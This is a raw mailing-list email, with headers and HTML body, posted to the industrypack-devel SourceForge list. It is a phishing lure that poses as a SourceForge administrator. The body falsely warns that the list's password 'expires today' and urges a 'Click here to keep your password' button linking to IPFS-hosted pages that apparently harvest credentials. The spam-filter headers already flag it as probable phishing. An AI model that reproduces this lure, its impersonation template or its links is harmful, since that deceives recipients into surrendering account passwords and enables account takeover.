Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id E9470AB260B
	for <lists+industrypack-devel@lfdr.de>; Sun, 11 May 2025 03:38:33 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:MIME-Version:
	Message-ID:Date:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=6R/kkBYD2LuBY61b/65151E3Gr2SttgCvjU+8/DtrdU=; b=FMnR56ravIhwdXnk2Lwd9MsB9L
	AHaPJUWC5YNhDzFbOvl9/jvqhpCHyz/Sc/PnDA3lhNsJV0uDrVJ04rg6Ryr37+pN5Xgq02O8WFmS8
	1uMoShxXafPYlnnXGDsLsPtTHXlIHQQO3l6ofvL/iuLp4cPuU9Dino/l0GtbPbINo+nE=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1uDvdz-0005Tq-Po
	for lists+industrypack-devel@lfdr.de;
	Sun, 11 May 2025 01:38:19 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <admin@newhomeinturkey.de>) id 1uDvdr-0005Te-0p
 for industrypack-devel@lists.sourceforge.net;
 Sun, 11 May 2025 01:38:11 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=jbEOfOhf63ZSqdS2gMP5E822TzpDfhNlYkWpYgTodAo=; b=MoqzqcsV7D+Ukzh6R05jz7zhvq
 cPE07taG68OkkgsdeAkNiFRE9RDJYKWCIS+kyADYMopAZNld4FxpI8Ma0Z3uAieo4d/9XVyFj37W9
 QGM/1nqvU9VLmJydpyYv9lf8jxiwT9QTiSNCfH/7EqaFRWbfjqQCayF3iO8K8jnVRHfc=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=jbEOfOhf63ZSqdS2gMP5E822TzpDfhNlYkWpYgTodAo=; b=a
 5VrrpibVu8RowBtWe4HdpocuhB4xpM/HG0seTR7R9EDmCJW6qWDx0VghZu4PQfFxShMSZo9/CCaDT
 /munXif1YnheDS/jXu3LPYbsia0AFqX9ke64GabiAszc0SbwcQ5F+HyyZ18JNpvb5accjitiIyseL
 I/EhmvMYNC9ZbX6U=;
Received: from [85.121.148.20] (helo=raew9Ppa.ava.hosting)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1uDvdn-0006oB-Sh for industrypack-devel@lists.sourceforge.net;
 Sun, 11 May 2025 01:38:08 +0000
Received: from newhomeinturkey.de (raew9Ppa.ava.hosting [IPv6:::1])
 by raew9Ppa.ava.hosting (Postfix) with ESMTP id 261782682E
 for <industrypack-devel@lists.sourceforge.net>;
 Sun, 11 May 2025 04:37:09 +0300 (EEST)
From: lists.sourceforge.net Admin <admin@newhomeinturkey.de>
To: industrypack-devel@lists.sourceforge.net
Date: 11 May 2025 01:37:08 -0700
Message-ID: <20250511013708.06E32D012F120F75@newhomeinturkey.de>
MIME-Version: 1.0
X-Spam-Score: 6.5 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: Account Security Check Dear
 industrypack-devel@lists.sourceforge.net
 Your password industrypack-devel@lists.sourceforge.net expires today 
 Content analysis details:   (6.5 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [85.121.148.20 listed in zen.spamhaus.org]
 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
 blocklist [URIs: ipfs.io]
 0.0 DATE_IN_FUTURE_06_12   Date: is 6 to 12 hours after Received: date
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 T_MXG_EMAIL_FRAG       URI with email in fragment
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [85.121.148.20 listed in bl.score.senderscore.com]
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [85.121.148.20 listed in sa-accredit.habeas.com]
 0.0 GOOG_REDIR_HTML_ONLY   Google redirect to obscure spamvertised
 website + HTML only
 0.4 URI_IPFSIO References Interplanetary File System PtP content via
 ipfs.io, likely phishing
 1.3 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.0 URI_IPFS               References Interplanetary File System PtP content, 
 probable phishing
 0.0 GOOG_REDIR_NORDNS      Google redirect to obscure spamvertised
 website + no rDNS
 0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
 only
X-Headers-End: 1uDvdn-0006oB-Sh
Subject: [Industrypack-devel] industrypack-devel@lists.sourceforge.net
 Account security check
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8042446988176448757=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============8042446988176448757==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.17037"></HEAD>
<body>
<DIV aria-expanded=3Dfalse spellcheck=3Dfalse role=3Dtextbox tabIndex=3D1 a=
ria-label=3D"Message Body" aria-multiline=3Dtrue aria-controls=3D:945 id=3D=
:pg class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" hideFocus contentEditab=
le=3Dtrue style=3D"DIRECTION: ltr; MIN-HEIGHT: 230px" aria-owns=3D:945 itac=
orner=3D"6,7:1,1,0,0" g_editable=3D"true" writingsuggestions=3D"false">
<DIV dir=3Dltr>
<DIV dir=3Dltr><SPAN style=3D"FONT-SIZE: 14px; FONT-FAMILY: Roboto,sans-ser=
if; COLOR: rgb(44,54,58)">&nbsp;</SPAN>
<table style=3D"FONT-SIZE: 15px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
ONT-FAMILY: Helvetica,Arial,Tahoma,Verdana,sans-serif; BORDER-RIGHT: rgb(21=
1,211,211) 1px dotted; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,21=
1,211) 1px dotted; COLOR: rgb(44,54,58); BORDER-LEFT: rgb(211,211,211) 1px =
dotted; LINE-HEIGHT: 1.2; TEXT-INDENT: 0px" cellspacing=3D"0" cellpadding=
=3D"0" width=3D"520" align=3D"center" border=3D"1">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; MIN-HEIGHT: 90px">
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted" height=3D"90">
<table style=3D"FONT-SIZE: 14px; BORDER-TOP: rgb(211,211,211) 1px dotted; F=
ONT-FAMILY: Arial,Helvetica; BORDER-RIGHT: rgb(211,211,211) 1px dotted; BOR=
DER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; MIN-HEI=
GHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted; LINE-HEIGHT: 1.2" cell=
spacing=3D"0" cellpadding=3D"0" width=3D"100%" bgcolor=3D"#0078d7" border=
=3D"1">
<TBODY style=3D"BOX-SIZING: border-box">
<TR style=3D"BOX-SIZING: border-box; MIN-HEIGHT: 90px">
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
MIN-HEIGHT: 90px; BORDER-LEFT: rgb(211,211,211) 1px dotted" bgcolor=3D"#007=
8d7" height=3D"90">
<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 18px; FONT-FAMILY: "UI WP =
Helvetica",Arial,serif,EmojiFont; COLOR: rgb(255,255,255); PADDING-BOTTOM: =
0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 30px; PADDING-RIGHT: =
0px'>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 28px; PADDING-BOTTOM: 0px;=
 PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 10px; PADDING-RIG=
HT: 0px">Account Security Check</DIV></DIV></TD></TR></TBODY></TABLE></TD><=
/TR>
<TR style=3D"BOX-SIZING: border-box">
<td style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(211,211,211) 1px dotte=
d; FONT-FAMILY: Roboto,RobotoDraft,Helvetica,Arial,sans-serif; BORDER-RIGHT=
: rgb(211,211,211) 1px dotted; BORDER-BOTTOM: rgb(211,211,211) 1px dotted; =
BORDER-LEFT: rgb(211,211,211) 1px dotted">
<DIV style=3D'BOX-SIZING: border-box; FONT-FAMILY: Segoe,Tahoma,"Sans Verda=
na",sans-serif,serif,EmojiFont; COLOR: rgb(51,51,51); PADDING-BOTTOM: 0px; =
DIRECTION: ltr; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px 0px 0px 12=
0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'>
<DIV style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px=
; PADDING-LEFT: 0px; MARGIN: 20px 120px 30px 0px; LINE-HEIGHT: 20px; PADDIN=
G-RIGHT: 0px">&nbsp;</DIV>
<DIV style=3D'BOX-SIZING: border-box; FONT-SIZE: 17px; FONT-FAMILY: "UI WP =
Segoe",Tahoma,"Sans Verdana",sans-serif,serif,EmojiFont; COLOR: rgb(0,120,2=
15); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px =
0px 10px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px'><FONT style=3D"BOX-SIZING:=
 border-box" color=3D#000000 size=3D3 face=3D"Times New Roman">Dear&nbsp; i=
ndustrypack-devel@lists.sourceforge.net</FONT></DIV>
<DIV style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; COLOR: rgb(102,102,1=
02); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px =
120px 30px 0px; LINE-HEIGHT: 20px; PADDING-RIGHT: 0px"><FONT style=3D"BOX-S=
IZING: border-box" color=3D#000000 size=3D3 face=3D"Times New Roman">Your p=
assword industrypack-devel@lists.sourceforge.net expires today</FONT><BR st=
yle=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box">
<A style=3D"BOX-SIZING: border-box; BACKGROUND-IMAGE: none; BACKGROUND-REPE=
AT: repeat; COLOR: white; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LE=
FT: 5px; DISPLAY: block; PADDING-RIGHT: 5px; BACKGROUND-COLOR: rgb(0,120,21=
5); text-decoration-line: none; background-size: auto" href=3D"https://ipfs=
=2Eio/ipfs/bafybeichgrzfhfc5wyunli4vwxtjglb7qrwpr46th4xwgtclswykreuvgu/chia=
ds.html#industrypack-devel@lists.sourceforge.net" rel=3Dnoreferrer target=
=3D_blank=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://ipfs.io/ipfs=
/bafybeicieuwoijjzsnnkco47ihshbau2l5zr23f3kdrmelkwbnm4qx5qqm/indesx.html%23=
%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1747004530057000&amp;usg=
=3DAOvVaw3sIeP7rZV29jTTjDxJnKko">Click here to keep your password</A><BR st=
yle=3D"BOX-SIZING: border-box"><BR style=3D"BOX-SIZING: border-box"><FONT s=
tyle=3D"BOX-SIZING: border-box" color=3D#000000 size=3D3 face=3D"Times New =
Roman"><SPAN style=3D"BOX-SIZING: border-box; TEXT-ALIGN: right">
&copy; 2025 </SPAN></FONT>Message Center Admin Support</DIV></DIV></TD></TR=
></TBODY></TABLE></DIV></DIV></DIV></BODY></HTML>


--===============8042446988176448757==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============8042446988176448757==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============8042446988176448757==--
